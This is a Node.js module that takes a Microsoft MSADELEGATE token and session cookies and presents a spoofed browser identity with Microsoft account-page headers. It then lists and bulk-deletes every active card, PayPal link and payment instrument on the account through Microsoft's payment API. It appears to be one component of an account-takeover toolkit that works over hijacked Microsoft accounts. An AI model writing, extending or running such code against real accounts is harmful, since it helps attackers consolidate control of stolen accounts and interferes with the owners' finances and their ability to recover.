const axiosModule = require('axios');

const excludedCards = new Set([
    '63ded5f7-c0a7-486c-9a56-f1cc30bc64a1',
    'be4de87d-7e38-4b2d-8836-9237eb32848e',
    'cdc85313-9b57-4052-81fb-dea336132cbf',
    'b32568b1-b346-4098-9482-da5aeb470f39',
    '9adb8e8b-5e59-4637-8862-6466bfbd7761',
    '384090d0-3854-424a-be16-09e79d2e07d1',
    '34233a81-c454-420d-8e58-c48d29ebf6fc'
]);

/**
 * Removes all active payment cards, paypal, and payment instruments from a Microsoft account.
 * @param {string} msatoken - MSADELEGATE1.0 auth token
 * @param {HttpClient} axios - HttpClient instance with session cookies
 * @returns {Promise<{status: boolean, removed: number, total: number, error?: string}>}
 */
async function removeCards(msatoken, axios) {
    try {
        if (!msatoken) {
            console.log('[REMOVE_CARDS] No MSAToken provided, skipping card removal.');
            return { status: false, removed: 0, total: 0, error: 'Missing MSAToken' };
        }

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Referer': 'https://account.microsoft.com/',
            'Content-Type': 'application/json',
            'Authorization': msatoken,
            'Origin': 'https://account.microsoft.com'
        };

        // 1. Fetch active payment instruments
        let response;
        try {
            response = await axios.get(
                'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,active_pending&language=en-US&partner=northstarweb',
                {
                    headers,
                    timeout: 10000
                }
            );
        } catch (fetchErr) {
            try {
                response = await axiosModule.get(
                    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,active_pending&language=en-US&partner=northstarweb',
                    {
                        headers,
                        timeout: 10000
                    }
                );
            } catch (fallbackErr) {
                console.error('[REMOVE_CARDS] Error fetching payment instruments:', fallbackErr.message);
                return { status: false, removed: 0, total: 0, error: fallbackErr.message };
            }
        }

        const instruments = Array.isArray(response?.data) ? response.data : [];
        if (instruments.length === 0) {
            console.log('[REMOVE_CARDS] No payment cards found on this account.');
            return { status: true, removed: 0, total: 0 };
        }

        // 2. Filter out non-removable items (e.g. stored_value / gift card balance or system exclusions)
        const removableCards = instruments.filter(card => {
            if (!card || !card.id) return false;
            if (excludedCards.has(card.id)) return false;
            const family = card.paymentMethod?.paymentMethodFamily?.toLowerCase();
            if (family === 'stored_value' || family === 'gift_card') return false;
            return true;
        });

        if (removableCards.length === 0) {
            console.log('[REMOVE_CARDS] No removable payment instruments found (only balance or exclusions).');
            return { status: true, removed: 0, total: 0 };
        }

        console.log(`[REMOVE_CARDS] Found ${removableCards.length} cards/payment methods to remove...`);

        // 3. Delete each card in parallel
        let removedCount = 0;
        await Promise.all(
            removableCards.map(async (card) => {
                const cardId = card.id;
                try {
                    let delRes;
                    try {
                        delRes = await axios.delete(
                            `https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstruments/${encodeURIComponent(cardId)}?partner=northstarweb`,
                            {
                                headers,
                                timeout: 10000
                            }
                        );
                    } catch (e1) {
                        delRes = await axios.delete(
                            `https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstruments/${encodeURIComponent(cardId)}`,
                            {
                                headers,
                                timeout: 10000
                            }
                        );
                    }

                    if (delRes?.status === 200 || delRes?.status === 204 || delRes?.status === 404) {
                        removedCount++;
                        console.log(`[REMOVE_CARDS] Successfully removed card ${cardId}`);
                    } else {
                        console.log(`[REMOVE_CARDS] Failed to remove card ${cardId} (Status: ${delRes?.status})`);
                    }
                } catch (delErr) {
                    console.error(`[REMOVE_CARDS] Error removing card ${cardId}:`, delErr.message);
                }
            })
        );

        console.log(`[REMOVE_CARDS] Removed ${removedCount}/${removableCards.length} cards.`);
        return {
            status: true,
            removed: removedCount,
            total: removableCards.length
        };
    } catch (err) {
        console.error('[REMOVE_CARDS] Unexpected error in removeCards:', err.message);
        return { status: false, removed: 0, total: 0, error: err.message };
    }
}

module.exports = removeCards;
